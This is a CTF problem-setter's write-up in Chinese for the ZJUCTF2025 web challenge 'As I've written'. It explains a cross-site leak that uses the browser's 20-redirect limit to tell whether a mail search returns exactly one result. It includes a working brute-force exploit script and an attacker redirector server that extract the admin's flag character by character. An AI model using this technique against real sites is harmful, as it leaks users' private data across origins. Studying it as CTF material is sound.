---
title: "[ZJUCTF2025] 命题人Writeup: As I've written"
date: 2025-11-25T17:26:11+08:00
tags:
---

我最喜欢的一道题。

# 题干

```js
// server.js
app.get('/mail-search/:lang', (req, res) => {
//  ...
	if(mails.length === 0){
		return res.render('index', {
			title: `搜索结果 - ${query}`,
			content: `<p>未找到相关邮件。</p>`,
			current: -1,
			user: user,
			list: db.prepare(`SELECT * FROM emails WHERE user = ?`).all(user).map(row => ({
				id: row.id,
				title: lang === 'zh' ? row.title_zh : row.title_en
			}))
		})
	}
	if(mails.length === 1){
		return res.redirect(`/mail/${lang}/${mails[0].id}`)
	}
	if(mails.length > 1) {
		return res.render('index', {
		title: `搜索结果 - ${query}`,
		content: `<p>找到 ${mails.length} 封相关邮件，请从侧边栏选择。</p>`,
		current: -1,
		user: user,
		list: mails.map(row => ({
			id: row.id,
			title: lang === 'zh' ? row.title_zh : row.title_en
		}))
	})}
//  ...
})
```

```js
// bot.js
router.get('/', async (req, res) => {
//  ...
    try {
        browser = await puppeteer.launch({
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        const p = await browser.newPage();
        p.setDefaultTimeout(10000);
        
        await browser.setCookie({
            name: 'secret',
            value: adminKey,
            domain: 'localhost:8080',
            httpOnly: true});

        // 这一定是一个不同以往的浪漫故事♪
        await p.goto(targetUrl, { waitUntil: "domcontentloaded", timeout: 8000 });

        // you have only 400ms if you have some CSS-based XSS attack
        await new Promise(r => setTimeout(r, 400));

        // you have to make your payload create a delay more than 2000ms
        // if you want to use time-based side-channel attack
        await new Promise(r => setTimeout(r, Math.round(Math.random() * 4000)));

        // 极端体验：怅然若失
        await browser.close();
        
        // 结局，如我们所书
        return res.end("Admin visited your site.");
    } catch (error) {
        console.log(error);
        return res.end("Don't hack my puppeteer.")
    } finally {
        if (browser) {
            await browser.close().catch(console.error);
        }
    }
//  ...
});
```

现在flag就在管理员的邮箱里，具体的说是管理员邮箱里一封邮件的标题。

# Writeup

请读文档：https://fetch.spec.whatwg.org/#http-redirect-fetch

> **4.5. HTTP-redirect fetch**
> To **HTTP-redirect fetch**, given a fetch params fetchParams and a response response, run these steps:
> 
> 1. Let request be fetchParams’s request.
> 1. Let internalResponse be response, if response is not a filtered response; otherwise response’s internal response.
> 1. Let locationURL be internalResponse’s location URL given request’s current URL’s fragment.
> 1. If locationURL is null, then return response.
> 1. If locationURL is failure, then return a network error.
> 1. If locationURL’s scheme is not an HTTP(S) scheme, then return a network error.
> 1. **If request’s redirect count is 20, then return a network error.**
> 1. Increase request’s redirect count by 1.
> 1. If request’s mode is "cors", locationURL includes credentials, and request’s origin is not same origin with locationURL’s origin, then return a network error.
> 1. If request’s response tainting is "cors" and locationURL includes credentials, then return a network error.

请看第7条：If request’s redirect count is 20, then return a network error. 当邮件搜索的结果恰好为1封邮件时，服务器会返回一个重定向响应.

那么，*What if the attacker redirected their own page 18 times and then redirected it to the victim’s website?*

<div style="max-width:400px;margin:auto;">

![](ERR.png)

</div>


答案是：puppeteer会进入catch分支，返回"Don't hack my puppeteer."，那么我们就实现了正误输入的差分。

# Exploit

```js
// exp.js
const ROOT = "http://127.0.0.1:54423"

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}"

let prefix="ZJUCTF{";
(async ()=>{
for(let i=0;i<32;i++){
    for(let c of charset){
        let attempt = prefix + c
        process.stdout.write(`Trying ${attempt}\r`)
        let resp = await fetch(`${ROOT}/bot?url=http://10.197.137.96:3000/redirect/18/?url=http://localhost:8080/mail-search/zh?q=${encodeURIComponent(attempt)}`)
        let text = await resp.text()
        if(text.includes("hack")){
            prefix += c
            console.log(`Found character: ${c}, prefix now: ${prefix}`)
            break
        }
    }
}
})();
```

```js
// redirector.js
const express = require('express');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

app.get('/redirect/:remain_times', (req, res) => {
    const remainTimes = parseInt(req.params.remain_times);
    const targetUrl = req.query.url;

    if (remainTimes === 0) {
        console.log(`最终重定向到: ${targetUrl}`);
        return res.redirect(targetUrl);
    }
    const nextRemainTimes = remainTimes - 1;
    const nextUrl = `/redirect/${nextRemainTimes}?url=${encodeURIComponent(targetUrl)}`;
    
    console.log(`当前剩余次数: ${remainTimes}, 下一次重定向到: ${nextUrl}`);

    res.redirect(nextUrl);
});

app.listen(port, () => {
    console.log(`重定向工具服务运行在 http://localhost:${port}`);
});
```

<!-- more -->